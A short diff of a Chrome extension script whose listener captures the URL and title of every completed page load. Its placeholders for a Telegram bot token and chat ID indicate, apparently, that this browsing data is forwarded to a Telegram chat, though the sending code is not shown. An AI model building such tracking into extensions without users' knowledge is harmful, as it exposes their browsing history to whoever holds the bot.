@@ -2,8 +2,8 @@
 
 chrome.webNavigation.onCompleted.addListener((details) => {
     const url = details.url;
-    const TOKEN = ""; // Replace with your Telegram bot token
-    const chatId = ""; // Replace with your chat ID or recipient's user ID
+    const TOKEN = "Enter Your Bot Token"; // Replace with your Telegram bot token
+    const chatId = "Enter Your Chart ID"; // Replace with your chat ID or recipient's user ID
     
     chrome.tabs.get(details.tabId, function (tab) {
         const tabTitle = tab.title;
